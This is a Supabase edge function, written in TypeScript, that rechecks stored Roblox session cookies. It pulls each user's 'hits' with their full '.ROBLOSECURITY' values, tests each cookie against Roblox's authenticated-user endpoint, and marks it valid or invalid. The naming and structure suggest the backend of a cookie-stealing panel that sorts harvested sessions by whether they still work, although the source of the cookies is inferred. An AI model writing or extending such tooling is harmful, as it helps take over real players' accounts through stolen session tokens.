// Re-validates stored Roblox cookies for the calling user's hits.
// Marks each hit's `is_valid` and updates `last_checked_at`.
import { createClient } from "npm:@supabase/supabase-js@2.95.0";
import { corsHeaders } from "npm:@supabase/supabase-js@2.95.0/cors";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const authHeader = req.headers.get("Authorization") ?? "";
    const jwt = authHeader.replace("Bearer ", "");
    if (!jwt) return json({ error: "Missing auth" }, 401);

    // Anon client to identify the calling user
    const userClient = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_ANON_KEY")!,
      { global: { headers: { Authorization: authHeader } } },
    );
    const { data: userData, error: userErr } = await userClient.auth.getUser(jwt);
    if (userErr || !userData.user) return json({ error: "Invalid auth" }, 401);

    // Service-role client for full-cookie access
    const admin = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    const body = await req.json().catch(() => ({})) as { hitId?: string };

    let query = admin
      .from("hits")
      .select("id, cookie_full")
      .eq("owner_id", userData.user.id)
      .not("cookie_full", "is", null);

    if (body.hitId) query = query.eq("id", body.hitId);

    const { data: hits, error } = await query.limit(200);
    if (error) return json({ error: error.message }, 500);
    if (!hits || hits.length === 0) return json({ checked: 0, valid: 0, invalid: 0 });

    let valid = 0, invalid = 0;
    const now = new Date().toISOString();

    // Check each cookie in parallel (capped to 10 at a time to avoid rate limits)
    const chunks: typeof hits[] = [];
    for (let i = 0; i < hits.length; i += 10) chunks.push(hits.slice(i, i + 10));

    for (const chunk of chunks) {
      await Promise.all(chunk.map(async (h) => {
        const ok = await isCookieValid(h.cookie_full!);
        if (ok) valid++; else invalid++;
        await admin
          .from("hits")
          .update({ is_valid: ok, last_checked_at: now })
          .eq("id", h.id);
      }));
    }

    return json({ checked: hits.length, valid, invalid });
  } catch (e) {
    console.error("recheck-cookies error", e);
    return json({ error: "Internal error" }, 500);
  }
});

async function isCookieValid(cookie: string): Promise<boolean> {
  try {
    const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    return r.ok;
  } catch { return false; }
}

function json(b: unknown, status = 200) {
  return new Response(JSON.stringify(b), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}
